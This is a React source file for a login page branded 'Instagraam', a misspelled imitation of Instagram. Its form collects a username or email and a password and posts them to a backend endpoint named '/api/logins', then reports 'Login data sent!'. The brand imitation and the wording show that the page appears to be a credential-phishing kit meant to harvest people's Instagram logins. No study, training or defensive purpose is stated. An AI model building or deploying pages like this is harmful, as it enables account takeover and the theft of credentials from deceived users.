import { useState } from "react";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();

    if (!username || !password) {
      setMsg("Please enter username and password.");
      return;
    }

    // POST login attempt to backend
    try {
      const res = await fetch("/api/logins", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.success) {
        setMsg("Login data sent!");
        setUsername("");
        setPassword("");
      } else {
        setMsg("Failed to send login data.");
      }
    } catch {
      setMsg("Network error.");
    }
  }

  return (
    <div className="container">
      <h1>Instagraam Login</h1>
      <form onSubmit={handleSubmit}>
        <label htmlFor="username">Username or email</label>
        <input
          id="username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Username or email"
          autoComplete="off"
          spellCheck="false"
        />
        <label htmlFor="password">Password</label>
        <input
          id="password"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          autoComplete="off"
          spellCheck="false"
        />
        <button type="submit">Log In</button>
      </form>
      {msg && <div className="message">{msg}</div>}
    </div>
  );
}